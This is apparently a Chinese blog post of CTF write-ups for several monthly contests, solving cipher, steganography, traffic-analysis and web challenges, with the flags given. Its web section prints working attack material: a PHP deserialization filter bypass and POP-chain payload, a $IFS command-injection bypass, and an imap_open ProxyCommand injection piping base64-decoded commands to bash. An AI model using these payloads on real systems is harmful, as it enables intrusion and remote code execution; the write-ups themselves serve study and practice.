class="number">19</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> c:</span><br><span class="line">        seq = (i*((ord(s)-ord(<span class="string">'a'</span>))-b)) % <span class="number">26</span></span><br><span class="line">        flag += chr(ord(<span class="string">'a'</span>)+seq)</span><br><span class="line">    print(flag)</span><br><span class="line">    flag = <span class="string">""</span></span><br></pre></td></tr></table></figure><p>然后即可找到flag</p><p><img src="/2020/09/13/month-race/12.png" alt></p><!-- youareright --><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>题目如下</p><blockquote><p>中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？</p><p>（企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶）</p></blockquote><p>这是一种数字密码表，好像叫110数字记忆表，是帮助提高记忆力的</p><p>直接网上找对应的值然后脚本，获取数字之后，每个数字的加30取ascii码值就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cipher = (<span class="string">"企鹅"</span>,<span class="string">"青蛙"</span>,<span class="string">"油漆"</span>,<span class="string">"花旗参"</span>,<span class="string">"救生圈"</span>,<span class="string">"油漆"</span>,<span class="string">"二胡"</span>,<span class="string">"二石"</span>,<span class="string">"漏斗"</span>,<span class="string">"二石"</span>,<span class="string">"二石"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"漏斗"</span>,<span class="string">"喇叭"</span>,</span><br><span class="line"><span class="string">"油漆"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"鹅卵石"</span>,<span class="string">"21世纪"</span>,<span class="string">"耳机"</span>,<span class="string">"油漆"</span>,<span class="string">"耳机"</span>,<span class="string">"二石"</span>,<span class="string">"二胡"</span>,<span class="string">"耳机"</span>,<span class="string">"21世纪"</span>,<span class="string">"企鹅"</span>,<span class="string">"二流子"</span>,<span class="string">"二石"</span>,<span class="string">"要发"</span>,</span><br><span class="line"><span class="string">"二石"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"油漆"</span>,<span class="string">"冰淇淋"</span>,<span class="string">"企鹅"</span>,<span class="string">"乔丹"</span>,<span class="string">"二石"</span>,<span class="string">"酒壶"</span>)</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">"企鹅"</span>:<span class="number">72</span>,<span class="string">"青蛙"</span>:<span class="number">78</span>,<span class="string">"油漆"</span>:<span class="number">67</span>,<span class="string">"花旗参"</span>:<span class="number">73</span>,<span class="string">"救生圈"</span>:<span class="number">93</span>,<span class="string">"二胡"</span>:<span class="number">25</span>,<span class="string">"二石"</span>:<span class="number">20</span>,<span class="string">"漏斗"</span>:<span class="number">69</span>,<span class="string">"喇叭"</span>:<span class="number">68</span>,<span class="string">"冰淇淋"</span>:<span class="number">70</span>,</span><br><span class="line"><span class="string">"鹅卵石"</span>:<span class="number">24</span>,<span class="string">"21世纪"</span>:<span class="number">21</span>,<span class="string">"耳机"</span>:<span class="number">27</span>,<span class="string">"二流子"</span>:<span class="number">26</span>,<span class="string">"要发"</span>:<span class="number">18</span>,<span class="string">"乔丹"</span>:<span class="number">23</span>,<span class="string">"酒壶"</span>:<span class="number">95</span>&#125;</span><br><span class="line"></span><br><span class="line">nums = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cipher:</span><br><span class="line">    temp = dic.get(item)</span><br><span class="line">    nums += str(temp)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)//<span class="number">2</span>):</span><br><span class="line">    flag += chr(int(nums[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>])+<span class="number">30</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="12月月赛"><a href="#12月月赛" class="headerlink" title="12月月赛"></a>12月月赛</h1><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>关注公主号，回复flag会返回一个问题 <code>什么牛不会跑</code> ，答案是 <code>蜗牛</code> ,然后即可得到flag</p><!-- flag{6ef1b2246e5e651a46bfa51cfa71b763} --><h3 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h3><p>尝试爆破，但是爆破了好久都没有成功，最终无奈看了一下题解，解开压缩包，之后就是docx隐写，在设置中显示隐藏文字即可。</p><!-- Flag{edaa144c91a4e5b817e4a18cbdb78879} --><h3 id="变换的指纹"><a href="#变换的指纹" class="headerlink" title="变换的指纹"></a>变换的指纹</h3><p>用CSDN密码库密码爆破。我失败了，看了别人的密码<code>!(()!@)6125dou</code>（注意结尾的空格），之后即可得到压缩包，</p><p>23685528276158852365572716835687172857481317</p><h3 id="JUJU"><a href="#JUJU" class="headerlink" title="JUJU"></a>JUJU</h3><p>题目提示了说<code>11只JUJU</code>，但是图片中却不够11个，可知是图片高度的问题，修改一下图片高度</p><p><img src="https://i.loli.net/2019/01/17/5c40908a8abf5.png" alt></p><p>然后即可看到类似base64编码的字符串<code>MZWGCZ33GQZTQMTEM5SGMMTEPU====</code>，但是解码失败，尝试后发现是base32编码的，解密即可得到flag<code>flag{4382dgdf2d}</code></p><h3 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h3><p>先随便查看http流量，在最后的流量中发现了压缩包的传输，查看流量大致可以看到黑客是不断探测目录，最终探测出了flag坐在目录，向服务器请求了hello.zip的文件内容，将文件提取出来，发现在文件末尾有提示文字<code>well,you need passwd!</code>，可知zip压缩包基本不可能是伪加密，应该是需要密码的，再次查看流量包，发现一条超长的http的数据包，发现一段jpg图片的十六进制，提取存储为jpg图片</p><p><img src="https://i.loli.net/2019/01/18/5c41e9b279481.png" alt></p><p>打开图片即可看到密码，解压即可看到flag</p><!-- flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z} --><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>代码审计，关键过滤如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/[oc]:\d+:/i'</span>,$data,$matches);</span><br></pre></td></tr></table></figure><p>可以看到是为了防止object类的序列化，但是过滤不够严谨，可以用 <code>+</code> 绕过 <code>o:14 -&gt; o:+14</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = <span class="string">"./&#123;$this-&gt;file&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$data = <span class="keyword">new</span> baby();</span><br><span class="line">$data-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(serialize(($data)));<span class="comment">//给输出加一个加号在url编码一下</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.71.29.5:10007&#x2F;?data&#x3D;O%3A%2B4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure><!-- flag{ad2328a2c3f0933c053fd3c6f28f6143} --><h3 id="ezweb2"><a href="#ezweb2" class="headerlink" title="ezweb2"></a>ezweb2</h3><p>既然是渗透测试，扫描一下目录，发现存在admin.php，登录后返回 <code>you are not admin.</code> ，查看cookie发现user值为<code>user</code>的base64值，我们将此值修改为 <code>admin</code> 的base64值，然后刷新可以看到一个命令执行界面，测试发现题目过滤了空格，尝试用$IFS绕过<br><code>cat$IFS/ffLAG_404</code> ，然后即可成功绕过</p><p><img src="https://i.loli.net/2019/01/16/5c3f3979d4b1c.png" alt="result"></p><!-- flag{6f1d95159e3b90ed28186c518dd15e8c} --><h1 id="1月月赛"><a href="#1月月赛" class="headerlink" title="1月月赛"></a>1月月赛</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h3><p>代码审计题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">            <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目考察pop链的构造，核心点在于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br></pre></td></tr></table></figure><p>代码中修改了变量的值，这样if函数验证就无法通过，为了解决这个问题可以使用PHP中的指针（引用），是$aaa指向变量$bbb，这样修改了$aaa的值即相当于修改了$bbb的值</p><p>构造pop链如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing = <span class="string">'O:4:"baby":3:&#123;s:9:" * skyobj";N;s:3:"aaa";s:4:"snow";s:3:"bbb";R:3;&#125;'</span>; </span><br><span class="line">&#125;  </span><br><span class="line">$b = <span class="keyword">new</span> baby();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data&#x3D;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;%00%2A%00skyobj&quot;%3BO%3A4%3A&quot;cool&quot;%3A3%3A%7Bs%3A8%3A&quot;filename&quot;%3Bs%3A8%3A&quot;flag.php&quot;%3Bs%3A4%3A&quot;nice&quot;%3BN%3Bs%3A6%3A&quot;amzing&quot;%3Bs%3A68%3A&quot;O%3A4%3A&quot;baby&quot;%3A3%3A%7Bs%3A9%3A&quot;+%2A+skyobj&quot;%3BN%3Bs%3A3%3A&quot;aaa&quot;%3Bs%3A4%3A&quot;snow&quot;%3Bs%3A3%3A&quot;bbb&quot;%3BR%3A3%3B%7D&quot;%3B%7Ds%3A3%3A&quot;aaa&quot;%3BN%3Bs%3A3%3A&quot;bbb&quot;%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>查看源代码即可得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $flag = 'flag&#123;bd75a38e62ec0e450745a8eb8e667f5b&#125;';</span></span><br><span class="line">$sth=<span class="string">'test5030b66d4bdtest35daed9d51e2688377299test'</span>;</span><br></pre></td></tr></table></figure><h2 id="MISC-3"><a href="#MISC-3" class="headerlink" title="MISC"></a>MISC</h2><h3 id="zhunianjixiang"><a href="#zhunianjixiang" class="headerlink" title="zhunianjixiang"></a>zhunianjixiang</h3><p>题目是一张图片，但是却有2MB，一看就藏东西了，foremost分离一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost zhu.jpg</span><br></pre></td></tr></table></figure><p>然后即可得到一张二维码，扫描一下</p><p><img src="https://i.loli.net/2019/01/31/5c52a84fc2d4e.png" alt></p><p>看来还有其他东西，stegsolve上查看一下得到flag</p><p><img src="https://i.loli.net/2019/01/31/5c52a85a2c2bf.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;You_ARE_SOsmart&#125;</span><br></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="真的是键盘吗"><a href="#真的是键盘吗" class="headerlink" title="真的是键盘吗"></a>真的是键盘吗</h3><blockquote><p>ypau_kjg;”g;”ypau+</p></blockquote><p>题目的提示不好，原题目的提示是<code>键盘之争</code>，百度一下即可发现是考察键盘的两种布局方式<a href="http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html" target="_blank" rel="noopener">链接</a>，按照两种方式一一对应即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">QWERTY = [<span class="string">'q'</span>,<span class="string">'w'</span>,<span class="string">'e'</span>,<span class="string">'r'</span>,<span class="string">'t'</span>,<span class="string">'y'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'s'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">';'</span>,<span class="string">'"'</span>,<span class="string">'z'</span>,<span class="string">'x'</span>,<span class="string">'c'</span>,<span class="string">'v'</span>,<span class="string">'b'</span>,<span class="string">'n'</span>,<span class="string">'m'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>,<span class="string">'_'</span>,<span class="string">'+'</span>]</span><br><span class="line">Dvorak = [<span class="string">'"'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'p'</span>,<span class="string">'y'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'c'</span>,<span class="string">'r'</span>,<span class="string">'l'</span>,<span class="string">'?'</span>,<span class="string">'+'</span>,<span class="string">'|'</span>,<span class="string">'a'</span>,<span class="string">'o'</span>,<span class="string">'e'</span>,<span class="string">'u'</span>,<span class="string">'i'</span>,<span class="string">'d'</span>,<span class="string">'h'</span>,<span class="string">'t'</span>,<span class="string">'n'</span>,<span class="string">'s'</span>,<span class="string">'_'</span>,<span class="string">';'</span>,<span class="string">'q'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'x'</span>,<span class="string">'b'</span>,<span class="string">'m'</span>,<span class="string">'w'</span>,<span class="string">'v'</span>,<span class="string">'z'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</span><br><span class="line">dic = dict(zip(QWERTY,Dvorak))</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">s = <span class="string">'ypau_kjg;"g;"ypau+'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag{this_is_flag}</p></blockquote><h3 id="get-it"><a href="#get-it" class="headerlink" title="get it"></a>get it</h3><blockquote><p>Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。</p><p>Eve窃听到这样一段内容，主要内容如下：<br>p = 37<br>A = 17<br>B = 31</p><p>U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2<br>l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O<br>K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62<br>7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw<br>HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal<br>+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK<br>ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl<br>VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6<br>m5lSYiFFd0E=</p><p>分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。</p><p>而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。</p><p>例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：</p><p>password = hashlib.md5(“(3,6,35)”).hexdigest()[0:16]</p></blockquote><h1 id="二月月赛"><a href="#二月月赛" class="headerlink" title="二月月赛"></a>二月月赛</h1><h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><p>注册登录，有个邮箱验证功能，验证之后新增一个改变背景的功能，允许图片上传，但是只允许上传jpg图片，查看源代码可以看到图片的存储位置<br><img src="https://i.loli.net/2019/02/28/5c778a7acd48e.png" alt><br>上传测试可以发现文件会被强制命名为<code>用户名.jpg</code>，截断什么的也不存在，当时就是做到这里没思路了，看了飘零学长的思路之后，知道了imap_open思路，该函数原型为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">imap_open(string $mailbox, string $username, string $password [, int $options = <span class="number">0</span> [, int $n_retries = <span class="number">0</span> [, <span class="keyword">array</span> $params = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure><p>漏洞在于$mailbox，用docker来测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search imap</span><br><span class="line">docker pull fedosov&#x2F;docker-php-imap-composer</span><br><span class="line">docker run -itd fedosov&#x2F;docker-php-imap-composer &#x2F;bin&#x2F;bash</span><br><span class="line">docker attach id</span><br></pre></td></tr></table></figure><p>写入一个实现漏洞测试函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">"echo skysky|tee /tmp/success"</span>;</span><br><span class="line">$encoded_payload = base64_encode($payload);</span><br><span class="line">$server = <span class="string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="string">"|base64\t-d|bash"</span>;</span><br><span class="line">@imap_open(<span class="string">'&#123;'</span>.$server.<span class="string">'&#125;:143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><p>在执行之前/tmp目录为空，运行该文件之后生成了success文件，据此我们可以通过邮箱验证功能向/user目录中写入文件，</p><p>但是实际操作失败了，不知道原因为何。</p><h2 id="MISC-4"><a href="#MISC-4" class="headerlink" title="MISC"></a>MISC</h2><h3 id="非常简单的流量分析"><a href="#非常简单的流量分析" class="headerlink" title="非常简单的流量分析"></a>非常简单的流量分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></figure><p>追踪http流可以看到存在abc.html页面，接续追踪该流量，查看abc.html页面内容</p><blockquote><p>md5 0x99a98e067af6b09e64f3740767096c96</p><p>DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d  (129-&gt;143)</p><p>DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b  (143-&gt;129)</p></blockquote><p>当时做到这里僵住了，没有考虑后面的ESP流量包，看wp可知ESP是通过IpSec协议加密过的流量，需要解密流量包</p><p>按照配置网上的思路配置一下esp秘钥，依次选择<code>编辑-&gt;首选项-&gt;Protocols-&gt;ESP</code></p><p>添加配置信息，协议选择ipv4，源IP和目的IP填好，SPI在数据包里面有，Encrypt选择TripleDES-CBC，选择对应的des秘钥， authentication选择MD5，选择上面MD5值<br><img src="https://i.loli.net/2019/02/28/5c7779afb7a07.png" alt></p><p>之后即可得到解密报文</p><p>发现http报文有点特殊</p><p><img src="https://i.loli.net/2019/02/28/5c7779ee0e7c4.png" alt></p><p>可以看到前几位是flag的ascii码值，将此种类型数据包提取出来处理一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'2.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    par = re.findall(<span class="string">r'include/information/.*_(.*)\.php'</span>,content)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> par:</span><br><span class="line">        flag += chr(int(i))</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>flag：<code>flag{27b03b758f255276e5a98da0e1947bed}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;历史文章补发&lt;/p&gt;
